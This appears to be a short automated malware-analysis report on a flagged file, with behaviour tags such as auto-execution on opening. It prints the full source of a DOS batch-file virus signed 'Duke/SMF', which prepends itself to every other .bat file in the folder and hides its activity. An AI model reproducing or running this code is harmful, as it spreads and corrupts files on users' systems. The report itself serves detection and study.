behavior.AUTOEXEC: Runs when the Word document is opened
behavior.call: May call a DLL using Excel 4 Macros

docinfo.macro:
@ctty nul%SMF%
if "%1=="@ goto SMFz
find "SMF"<%0>SMF.bat
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call SMF.bat @ %%b
del SMF.*
ctty con%SMF%
@goto SMF
:SMFz
find "SMF"<%2
if not errorlevel 1 goto SMF
type %2>SMF.1
type SMF.bat>%2
type SMF.1>>%2
:SMF [Duke/SMF]

filetype: ASCII text, with CRLF line terminators

dump: for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call SMF.bat @ %%b
